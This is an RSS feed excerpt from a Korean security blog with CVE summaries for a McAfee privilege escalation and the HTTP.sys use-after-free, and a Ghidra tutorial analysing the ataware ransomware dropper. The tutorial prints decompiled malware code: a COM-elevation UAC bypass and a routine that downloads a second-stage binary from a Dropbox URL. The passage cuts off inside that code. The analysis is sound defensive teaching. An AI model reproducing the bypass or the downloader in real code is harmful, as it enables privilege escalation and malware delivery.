<code>ImanageOem::RunProgram</code>을 통해 <code>NT Authority\System</code> 권한으로 임의 프로세스 실행이 가능합니다. 하지만 COM 객체를 구현할 때 ProxyStub DLL에 self-defense 기능이 존재합니다. 이는 PEB 구조를 수정하여 <code>ValidateModule</code> 함수의 유효성 검사 시 프록시가 호출되는 모듈의 경로를 스푸핑하여 우회가 가능합니다. 첫 번째 검사가 수행되기 전에 McAfee의 서명이 된 아무 바이너리의 경로를 <code>MasqueradeImagePath</code> 함수를 호출하여 우회가 가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/mcafee/">mcafee</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/com/">com</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-process-execution/">arbitrary process execution</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/20/idioth/2021-05-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-31166: HTTP.sys 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/19/fabu1ous/2021-05-19/</link>
      <guid>https://hackyboiz.github.io/2021/05/19/fabu1ous/2021-05-19/</guid>
      <pubDate>Wed, 19 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/5/17/cve-2021</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/17/cve-2021-31166-a-wormable-code-execution-bug-in-httpsys">A WORMABLE CODE EXECUTION BUG IN HTTP.SYS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10</p><p>Windows server 2004</p><p>Windows server 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>커널 드라이버 Http.sys를 사용하는 웹서버 IIS(Internet Information services) Windows Server에서 원격 코드 실행 취약점이 발견되었습니다. Http.sys는 http request 파싱 및 클라이언트로 보낼 response 생성을 담당합니다. 해당 취약점은 Http request header <code>Accept-Encoding</code>을 파싱 하고 관리하는 메커니즘의 설계 결함으로 발생합니다. </p><p>클라이언트는  <code>Accept-Encoding</code> header를 사용해 웹서버에게 사용 가능한 데이터 압축 방식을 전달합니다. 웹서버는 전달받은  <code>Accept-Encodeing</code>의 필드 값을 파싱하고 unknown, supported, invalid로 구분해 연결 리스트를 생성하고 관리합니다. unknown의 경우 원형 이중 연결 리스트를 사용하고, 파싱이 끝나 연결 리스트가 완성되면 스택 메모리에 있는 기존 root 노드를 버리고 internal structure 속 root 노드로 연결 리스트를 옮기는 작업을 합니다. 이때 기존 root 노드가 초기화되지 않아 여전히 연결 리스트에 연결되어 있고 이를 통해 use-after-free가 발생합니다. 해커는 이를 악용한 악성 HTTP request를 원격 시스템에 보내 Kernel 권한으로 임의 코드 실행을 할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/wormable/">wormable</category>
      
      <category domain="https://hackyboiz.github.io/tags/http/">http</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/19/fabu1ous/2021-05-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</title>
      <link>https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/</link>
      <guid>https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/</guid>
      <pubDate>Wed, 19 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;strong&gt;다른 파트 보러가기&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/&quot;&gt;Re:versing으로 시작하는 ghidra 생활 Part</description>
        
      
      
      
      <content:encoded><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User (Here!)</a></p><p>Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1) (Here!)</p><hr><p>반갑습니다. 3일 만에 뵙는군요. 일요일 번역 글에서 말씀 드렸다시피 ghidra 글을 빠르게(?) 작성을 해왔습니다.</p><p>사실상 분석을 하면서 느낀 점은 아 이거 일일이 다 세세하게 하면 뭔가 주객이 전도되는 거 같은데… ghidra 글이 아니라 악성코드 분석에 초점이 맞춰지는 거 아닌가? <del>틀린 부분이 있으면 어떡하지</del>라는 생각으로 인해 가볍게 어떠한 식으로 분석을 하기 편하게 디컴파일러를 설정할 수 있는지! 중점으로 다룰 예정입니다. </p><p>분석을 해볼 악성코드는 ataware 랜섬웨어입니다. 스크립트 → ATAPIinit → ATAPIConfiguration → ATAPIUpdtr 순으로 바이너리를 드롭하고 악성 행위를 진행합니다.</p><p>해당 글은 ghidra에 관련된 글이기 때문에 뒤에 세 개의 바이너리를 분석할 예정입니다. 이번 게시글에서는 ATAPinit에 대해서 다루어 봅시다!</p><h1 id="ghidra를-통해-분석-고고"><a href="#ghidra를-통해-분석-고고" class="headerlink" title="ghidra를 통해 분석 고고"></a>ghidra를 통해 분석 고고</h1><p>ATAPIinit 바이너리는 <a href="https://app.any.run/tasks/e8e682e8-6d7f-42c8-ad3f-6afa980a77e3/">app.any.run</a>에서 받으실 수 있습니다.</p><p>일단 먼저 해당 바이너리에 대해서 알아보기 위해 Detect It Easy에 ATAPinit을 넣어봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled.png"></p><p>MinGW로 컴파일되었으며, 32비트 바이너리네요.</p><p>문자열을 확인을 해서 어떤 동작을 하는지 대강 유추를 해봅시다. PEStudio로 확인을 해보도록 하겠습니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%201.png"></p><p>눈에 띄는 문자열은 <code>Elevation:Administrator!new:</code>, <code>CLSIDFromString</code>, <code>&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;</code>, <code>dl.dropboxusercontent.com</code>정도 입니다.</p><p><code>&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;</code>를 통해서 구글에 검색을 해본 결과 COM Interface를 통해 UAC bypass를 하는 기법에 대해서 나오네요. <code>Elevation:Administarator!new:</code>와 연계했을 때 COM을 사용해서 권한 상승을 한 후, <code>dl.dropboxusercontent.com</code> 링크를 통해 ATAPIConfiguration을 다운로드한다라고 생각을 할 수 있습니다!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%202.png"></p><p>앗! 그럼 이제 대충 어떤 작업을 하는지 알았으니 ghidra를 사용하여 봅시다. 🙂</p><p>악성코드 분석 파트에서는 Variable/Function rename, Data type Redefine, Redefine Function Signature 등의 기능을 많이 사용할 예정입니다. 좀 더 보기 편하게 만들기 위해서요!</p><p>먼저 새 프로젝트(저의 경우 ataware로 만들었습니다.)를 생성한 후 ATAPIinit을 추가하고 열어서 analysis를 합시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%203.png"></p><h2 id="UAC-Bypass-함수"><a href="#UAC-Bypass-함수" class="headerlink" title="UAC Bypass 함수"></a>UAC Bypass 함수</h2><p>Aggressive Instruction Finder는 체크가 풀려있으니 체크를 하고 Analyze를 합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%204.png"></p><p><code>entry</code>에서 <code>FUN_00401570</code>을 찾습니다. 이 부분을 중점적으로(?) 분석을 해볼 계획입니다. 클릭을 해서 들어가면 여러 개의 함수를 호출합니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401570</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  FUN_0040da90();  DAT_00416020 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  DAT_00416024 = FUN_00410ab0(<span class="hljs-number">0x20a</span>);  FUN_00401657(<span class="hljs-number">0</span>);  FUN_004017e4();  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;&#125;</code></pre><p>그중에서 아까 위에서 확인했던 부분인 COM을 이용하여 UAC를 우회하는 함수를 살펴봅시다! <code>FUN_004017e4()</code>로 들어가시면 됩니다. 처음 들어갔을 때, 디컴파일러에서 나오는 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004017e4</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HMODULE pHVar1;  <span class="hljs-keyword">int</span> iVar2;  undefined *puVar3;  <span class="hljs-keyword">int</span> **ppiVar4;  <span class="hljs-keyword">wchar_t</span> local_27c [<span class="hljs-number">260</span>];  undefined4 local_74 [<span class="hljs-number">5</span>];  undefined4 local_60;  <span class="hljs-keyword">int</span> *local_50;  undefined local_4c [<span class="hljs-number">16</span>];  undefined local_3c [<span class="hljs-number">16</span>];  FARPROC local_2c;  FARPROC local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  HMODULE local_18;  <span class="hljs-keyword">int</span> local_14;  <span class="hljs-keyword">int</span> local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  local_50 = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  local_18 = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  local_1c = GetProcAddress(local_18,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  ppiVar4 = (<span class="hljs-keyword">int</span> **)<span class="hljs-number">0x6</span>;  puVar3 = (undefined *)<span class="hljs-number">0x0</span>;  local_20 = (*local_1c)(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_24 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  local_28 = GetProcAddress(pHVar1,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> &#123;    iVar2 = (*local_24)(<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>,local_4c,puVar3,ppiVar4);    <span class="hljs-keyword">if</span> ((iVar2 != <span class="hljs-number">0</span>) ||       (iVar2 = (*local_28)(<span class="hljs-string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span>,local_3c), iVar2 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    FUN_0040f860((undefined *)local_27c,<span class="hljs-number">0x208</span>);    wcscpy(local_27c,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(local_27c,<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>);    FUN_0040f860((undefined *)local_74,<span class="hljs-number">0x24</span>);    local_74[<span class="hljs-number">0</span>] = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    pHVar1 = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    local_2c = GetProcAddress(pHVar1,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    ppiVar4 = &amp;local_50;    puVar3 = local_3c;    local_10 = (*local_2c)(local_27c,local_74);    FUN_00401a0f();    local_10 = (**(code **)(*local_50 + <span class="hljs-number">0x24</span>))(local_50,DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  &#125; <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_50 != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) &#123;    (**(code **)(*local_50 + <span class="hljs-number">8</span>))(local_50);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>GetProcAddress</code>로 함수들의 주소를 가져와서… 함수 포인터로 실행을 하는데 뭐가 무엇을 하는지  눈에 확인하기가 어렵습니다. 이럴 때는 Rename Variable (L)과 Retype Variable (Ctrl + L)을 사용하여 한눈에 보기 쉽게 만들 수도 있고, 파라미터로 들어가는 값들의 데이터 타입도 자동으로 맞춰 줍니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%205.png"></p><p><code>local_18</code>과 <code>local_1c</code>의 이름을 변경했습니다. <code>FARPROC</code>으로 되어있는 <code>CoInitializeEx_addr</code>은 <code>CoInitializeEx</code>의 주소를 담고 있으니, 데이터 타입을 <code>CoInitializeEx *</code>로 바꾸어볼까요?</p><p><code>CoInitializeEx_addr</code>에 마우스 커서를 올리고 우클릭 후 Retype Variable 혹은 Ctrl + L을 누르면 다음과 같은 창이 뜹니다. 거기에 적혀있는 <code>FARPROC</code>을 지우고 <code>CoInitializeEx *</code>를 작성한 후 OK!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%206.png"></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%207.png"></p><p>그럼 위와 같이 함수 타입을 설정하는 창이 뜹니다. 우리가 사용할 함수가 맞으니까 OK 버튼을 눌러주면 다음과 같이 바뀝니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%208.png"></p><p>한눈에 보기 훨씬 편해졌습니다.</p><p>다른 부분도 위와 동일하게 Rename, Retype을 진행한 후 해당 함수에서 호출하는 다른 함수들이 어떠한 동작을 하는지 확인해봅시다.</p><p>먼저 <code>FUN_0040f860</code>를 살펴봅시다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_0040f860</span><span class="hljs-params">(undefined *param_1,<span class="hljs-keyword">int</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  undefined *puVar1;    puVar1 = param_1 + param_2;  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">do</span> &#123;      *param_1 = <span class="hljs-number">0</span>;      param_1 = param_1 + <span class="hljs-number">1</span>;    &#125; <span class="hljs-keyword">while</span> (puVar1 != param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>포인터를 받아서 <code>param2</code>만큼 0으로 초기화합니다. 해당 함수는 <code>RtlSecureMemory()</code>와 매우 흡사하죠.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CRT__NO_INLINE 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function">PVOID WINAPI <span class="hljs-title">RtlSecureZeroMemory</span><span class="hljs-params">(PVOID ptr,SIZE_T cnt)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *vptr = (<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *)ptr;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __x86_64</span>  __stosb ((PBYTE)((DWORD64)vptr),<span class="hljs-number">0</span>,cnt);<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>  <span class="hljs-keyword">while</span> (cnt != <span class="hljs-number">0</span>)    &#123;      *vptr++ = <span class="hljs-number">0</span>;      cnt--;    &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">/* __x86_64 */</span></span>  <span class="hljs-keyword">return</span> ptr;</code></pre><p>출처 : <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c">https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c</a></p><p>해당 함수의 이름을 <code>RtlSecureMemory</code>로 하고 Function Signature를 수정하도록 하겠습니다. 함수 이름에 커서를 올린 후 우클릭 - Edit Function Signature를 클릭하여 위의 소스 코드에 나온 Signature와 동일하게 수정해줍니다. </p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%209.png"></p><p>그리고 OK를 클릭하면</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">RtlSecureMemory</span><span class="hljs-params">(PVOID param_1,SIZE_T param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  undefined *puVar1;    puVar1 = (undefined *)((<span class="hljs-keyword">int</span>)param_1 + param_2);  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">do</span> &#123;      *(undefined *)param_1 = <span class="hljs-number">0</span>;      param_1 = (PVOID)((<span class="hljs-keyword">int</span>)param_1 + <span class="hljs-number">1</span>);    &#125; <span class="hljs-keyword">while</span> (puVar1 != (undefined *)param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>깔끔하게(?) 바뀐 것을 확인할 수 있습니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2010.png"></p><p>하하하 괜찮습니다. 그럼 이제 다음 함수인 <code>FUN_00401a0f</code>가 어떠한 동작을 하는지 확인해봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2011.png"></p><p>앞부분을 읽어보니 인터넷에 연결을 해서 해당 URL에서 ATAPIConfiguration을 다운로드하는 함수임을 짐작할 수 있습니다. 일단 함수명을 <code>download_ATAPIConfiguration</code>이라고 합시다. 이 함수의 전체적인 동작 기능을 정리해보면</p><ol><li><a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512">COM 인터페이스를 사용하여 UAC를 우회</a></li><li>인터넷에서 ATAPIConfiguration을 다운로드</li></ol><p>그럼 해당 함수 이름은 uac_bypass_and_download_file로 하여 정리를 하면 다음과 같은 코드가 됩니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uac_bypass_download_file</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HMODULE HModule;  HRESULT HVar1;  <span class="hljs-keyword">wchar_t</span> <span class="hljs-built_in">string</span> [<span class="hljs-number">260</span>];  BIND_OPTS pBindOptions;  undefined4 local_60;  <span class="hljs-keyword">int</span> *ppv;  CLSID local_4c;  IID riid;  CoGetObject *CoGetObject_addr;  IIDFromString *IIDFromString_addr;  CLSIDFromString *CLSIDFromString_addr;  HRESULT local_20;  CoInitializeEx *CoInitializeEx_addr;  HMODULE hModule;  <span class="hljs-keyword">int</span> local_14;  HRESULT local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  ppv = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  hModule = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  CoInitializeEx_addr = (CoInitializeEx *)GetProcAddress(hModule,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  local_20 = (*CoInitializeEx_addr)((LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">6</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  CLSIDFromString_addr = (CLSIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  IIDFromString_addr = (IIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> &#123;    HVar1 = (*CLSIDFromString_addr)(<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>,(LPCLSID)&amp;local_4c);    <span class="hljs-keyword">if</span> ((HVar1 != <span class="hljs-number">0</span>) ||       (HVar1 = (*IIDFromString_addr)(<span class="hljs-string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span>,(LPIID)&amp;riid),       HVar1 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    RtlSecureZeroMemory(<span class="hljs-built_in">string</span>,<span class="hljs-number">0x208</span>);    wcscpy(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>);    RtlSecureZeroMemory(&amp;pBindOptions,<span class="hljs-number">0x24</span>);    pBindOptions.cbStruct = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    CoGetObject_addr = (CoGetObject *)GetProcAddress(HModule,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    local_10 = (*CoGetObject_addr)(<span class="hljs-built_in">string</span>,&amp;pBindOptions,&amp;riid,&amp;ppv);    download_ATAPIConfiguration();    local_10 = (**(code **)(*ppv + <span class="hljs-number">0x24</span>))(ppv,download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  &#125; <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (ppv != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) &#123;    (**(code **)(*ppv + <span class="hljs-number">8</span>))(ppv);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><h2 id="ATAPIConfiguration-다운로드-함수"><a href="#ATAPIConfiguration-다운로드-함수" class="headerlink" title="ATAPIConfiguration 다운로드 함수"></a>ATAPIConfiguration 다운로드 함수</h2><p>이제 아까 지나쳤던 <code>download_ATAPIConfiguration()</code>을 분석을 해봅시다.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE pHVar4;  <span class="hljs-keyword">int</span> iVar5;  <span class="hljs-keyword">size_t</span> sVar6;  undefined4 *puVar7;  uint uVar8;  LPCSTR pCVar9;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 local_5c;  uint local_58;  FARPROC local_54;  FARPROC local_50;  FARPROC local_4c;  HANDLE local_48;  FARPROC local_44;  <span class="hljs-keyword">char</span> *local_40;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  <span class="hljs-keyword">int</span> local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  local_14 = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*local_14)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    local_1c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_20 = (*local_1c)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_20 == <span class="hljs-number">0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      local_24 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_28 = (*local_24)(local_20,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_28 == <span class="hljs-number">0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        local_5c = <span class="hljs-number">4</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_2c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar5 = (*local_2c)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,&amp;local_5c);        <span class="hljs-keyword">if</span> (iVar5 != <span class="hljs-number">0</span>) &#123;          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_30 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_58 = local_58 | <span class="hljs-number">0x1180</span>;          (*local_30)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,<span class="hljs-number">4</span>);        &#125;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_34 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*local_34)(local_28,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        local_40 = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        sVar6 = <span class="hljs-built_in">strlen</span>(local_40);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(sVar6 + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,local_40);        uVar8 = <span class="hljs-number">0xffffffff</span>;        pCVar9 = DAT_0041602c;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar8 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar8 = uVar8 - <span class="hljs-number">1</span>;          cVar1 = *pCVar9;          pCVar9 = pCVar9 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar7 = (undefined4 *)(DAT_0041602c + (~uVar8 - <span class="hljs-number">1</span>));        *puVar7 = <span class="hljs-number">0x4154415c</span>;        puVar7[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar7[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar7[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar7[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar7[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,DAT_00416028,<span class="hljs-number">0x1000</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_44 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_48 = (HANDLE)(*local_44)(DAT_00416028,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        